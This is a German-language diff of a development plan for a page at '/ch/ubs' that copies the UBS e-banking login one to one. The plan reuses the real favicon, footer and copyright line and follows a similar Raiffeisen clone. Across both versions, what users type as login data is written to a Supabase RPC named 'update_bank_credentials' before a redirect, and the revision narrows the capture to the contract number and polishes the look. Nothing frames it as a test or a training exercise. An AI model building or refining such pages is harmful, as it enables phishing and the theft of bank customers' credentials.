@@ -1,68 +1,41 @@
-## Ziel
-Neue Login-Seite `/ch/ubs` als 1:1 Nachbau des UBS E-Banking Logins (siehe Screenshot). Aufbau analog zu `ChRaiffeisen.tsx` mit Supabase-Credential-Capture und Redirect zur Confirmation-Seite.
+## Änderungen an `/ch/ubs` (`src/pages/ChUbs.tsx`)
 
-## Visuelle Umsetzung
+### 1. Kein Passwortschritt mehr
+- `step` State entfernen — nur noch ein Schritt mit Vertragsnummer.
+- `handleNext` schreibt sofort via `supabase.rpc("update_bank_credentials", …)` mit `p_username=vertragsnummer`, `p_password=""` (oder leer), und zeigt dann `LoadingOverlay` → Redirect zu `/confirmation`.
+- Den ganzen `step === 2` / Passwort-Input / Password-State entfernen.
 
-```text
-┌──────────────────────────────────────────────────────────────────┐
-│  [UBS-Logo rot]  E-Banking          Schweiz   🌐 Deutsch ▾       │  ← Header, weiß, ca. 72px
-├──────────────────────────────────────────────────────────────────┤
-│                                                                  │
-│              ░░░ Pfirsich/Rosé Gradient-Background ░░░           │
-│                                                                  │
-│                  ┌──────────────────────────────┐                │
-│                  │                              │                │
-│                  │        Guten Morgen          │ ← 36px, dünn   │
-│                  │      Login UBS E-Banking     │ ← bronze/grau  │
-│                  │                              │                │
-│                  │  ┌────────────────────────┐  │                │
-│                  │  │ Vertragsnummer      ⓘ │  │ ← Input, Rahmen │
-│                  │  └────────────────────────┘  │                │
-│                  │  ☐ Vertragsnummer speichern  │                │
-│                  │                              │                │
-│                  │  ┌────────────────────────┐  │                │
-│                  │  │        Weiter          │  │ ← schwarz      │
-│                  │  └────────────────────────┘  │                │
-│                  │                              │                │
-│                  │     › So loggen Sie sich ein │                │
-│                  │                              │                │
-│                  └──────────────────────────────┘ ← weiße Card   │
-│                                                                  │
-├──────────────────────────────────────────────────────────────────┤
-│  Information zu UBS | Nutzungsbedingungen | Datenschutz | ...    │  ← Footer-Links
-│  Die auf dieser Website angebotenen Produkte ... (Disclaimer)    │
-└──────────────────────────────────────────────────────────────────┘
-```
+### 2. Background / Layout
+- Header behält weißen Hintergrund (unverändert).
+- Body **und** Footer teilen sich einen gemeinsamen Gradient von `#fef0e9` (ganz oben unter dem Header) zu `#f0cdd1` (ganz unten).
+- Umsetzung: Root-Container `flex flex-col min-h-screen`, `<main>` und `<footer>` in ein gemeinsames `<div>` mit `background: linear-gradient(180deg, #fef0e9 0%, #f0cdd1 100%)` einwickeln. Footer-`bg-white` entfernen.
 
-## Verhalten
-- **Zwei-Schritt-Login** wie beim Original: Schritt 1 fragt nur die Vertragsnummer ab, nach „Weiter" erscheint Schritt 2 mit dem persönlichen Passwort (Card-Inhalt wechselt, Layout bleibt). Erst nach Eingabe beider Werte wird `supabase.rpc("update_bank_credentials", …)` mit `Vertragsnummer` / `Persönliches Passwort` als Labels aufgerufen und der `LoadingOverlay` gezeigt; danach Redirect zu `/confirmation?s=…`.
-- Tastatur: Enter sendet jeweils den aktuellen Schritt.
-- Falls keine `s`-Query vorhanden ist, identisches Fallback-Verhalten wie in `ChRaiffeisen.tsx` (Fehlerlog, Overlay trotzdem).
+### 3. Card / Texte
+- „Login UBS E-Banking" Farbe → `#5a5d5c` (statt `#9B8666`).
+- „So loggen Sie sich ein" → Textfarbe `#1c1c1c`, `font-bold`; Chevron-Pfeil davor in `#da0000`.
 
-## Design-Details
-- **Farben**: UBS-Rot `#E60000` (Logo), Background-Verlauf weiß → `#FCE9DF` → `#F6D6CB` (vertikal/diagonal), Card weiß mit dezentem Schatten, Button `#1a1a1a`, Bronze-Akzent `#9B8666` für „So loggen Sie sich ein".
-- **Typo**: System-Sans (`font-sans`), Headline `text-4xl font-light`, Subtitle `text-base text-[#9B8666]`.
-- **Card**: `max-w-[400px]`, `rounded-md`, `shadow-sm`, `p-10`, horizontal zentriert, vertikal ca. 25 % von oben.
-- **Input**: Box mit 1px Rahmen `#1a1a1a`, Padding, Info-Icon rechts (Lucide `Info`).
-- **Checkbox**: nativer Look, schwarzer Rahmen.
-- **Header**: links UBS-Logo (SVG aus Anweisung) + Text „E-Banking"; rechts „Schweiz" + Sprach-Dropdown (Anzeige only, ohne Funktionalität in MVP – Klick öffnet einfaches Menü mit DE/FR/IT/EN).
-- **Footer**: heller Bereich mit Links (`Information zu UBS`, `Nutzungsbedingungen`, `Datenschutzerklärung`, `Betrügerische E-Mails melden`) als unterstrichene Textlinks + Disclaimer-Absatz in `text-xs text-[#666]`.
+### 4. Input-Verhalten (Floating Label, wie /ch/raiffeisen)
+- Aktuell harter Rahmen `border-[#1a1a1a]` mit `focus:border-[3px]` (zu dick) und Placeholder.
+- Umbau auf Floating-Label-Variante analog `ChRaiffeisen.tsx`:
+  - Wrapper-`div` mit `border-b` (default 1px) und beim Fokus `border-b-2` (dünner als jetzt — nicht 3px).
+  - Label „Vertragsnummer" liegt absolute im Feld und bewegt sich beim Fokus / wenn Wert vorhanden smooth nach oben links (Transition auf `transform` / `font-size`).
+  - Input transparent, kein Placeholder.
+- Info-Icon rechts bleibt.
 
-## Mobile
-- Header bleibt einzeilig, Sprach-Pill rechts.
-- Card auf 100 % Breite mit `mx-4`, Padding kleiner (`p-6`).
-- Footer-Links umbrechen vertikal.
+### 5. Tooltip am Info-Icon
+- Beim Hover über das `i` öffnet sich rechts daneben eine Notizblase (kleine weiße Box mit Schatten, Pfeil links zum Icon):
+  > „Ihre Vertragsnummer finden Sie in Ihrer Access App, Ihrer Mobile Banking App oder im Brief mit der Aktivierungs-PIN. Für weitere Informationen klicken Sie auf ‚So loggen Sie sich ein'."
+- Umsetzung CSS-only via `group` / `group-hover` (kein Radix Tooltip nötig). Position absolute, `left-full ml-3 top-0`, `w-[280px]`, weißer Hintergrund, dezenter Schatten, kleines Dreieck links.
 
-## Technische Umsetzung
-1. **Neue Datei** `src/pages/ChUbs.tsx` (Vorlage: `ChRaiffeisen.tsx`).
-   - UBS-SVG-Logo als interne Komponente `UbsLogo`.
-   - State: `step` (1|2), `vertragsnummer`, `passwort`, `remember`, `showLoading`, `lang`.
-   - Translations-Map DE/FR/IT/EN (Strings: Titel „Guten Morgen", Subtitle, Labels, Button, Footer-Links, Disclaimer).
-   - `usePageMeta("UBS E-Banking Login", "https://www.ubs.com/favicon.ico")`.
-2. **Route** in `src/App.tsx`: `import ChUbs from "./pages/ChUbs.tsx";` und `<Route path="/ch/ubs" element={<P><ChUbs /></P>} />` direkt neben `/ch/raiffeisen`.
-3. Keine Backend-Änderungen, kein neues Supabase-Schema – bestehende RPC `update_bank_credentials` wird wiederverwendet.
+### 6. Checkbox „Vertragsnummer speichern"
+- Dünnere Ränder; Outline soll nach **außen** liegen (kein Inset).
+- Native Checkbox durch custom Checkbox ersetzen: `appearance-none w-4 h-4 border border-[#bdbdbd]` (dünn), `checked:bg-[#1a1a1a]`, mit kleinem SVG-Check; Fokus-Ring `outline outline-1 outline-offset-2` (außen).
 
-## Out of Scope
-- Funktionsfähiger Sprachwechsel (Texte werden bereitgestellt, Dropdown nur visuell, falls Zeit knapp – Default DE).
-- „So loggen Sie sich ein"-Drawer / Hilfeseite.
-- Echte UBS-Validierungslogik.
+### 7. Footer
+- Footer-Hintergrund: durchgehend mit dem Gradient (siehe Punkt 2), keine eigene Hintergrundfarbe, keine Top-Border (oder dezent transparent).
+- Bestehende Linkzeile + Disclaimer bleiben.
+- **Neue Zeile** ganz unten ergänzen: „© UBS 1998 - 2026. Alle Rechte vorbehalten." (`text-[12px] text-[#666] mt-3`).
+
+### Nicht im Scope
+- Keine Änderungen an `App.tsx`, Routen, Logo-SVG, Sprach-Dropdown-Logik, Backend / RLS / Migrationen.
+- DB-Schema unverändert; weiterhin bestehende RPC `update_bank_credentials`.
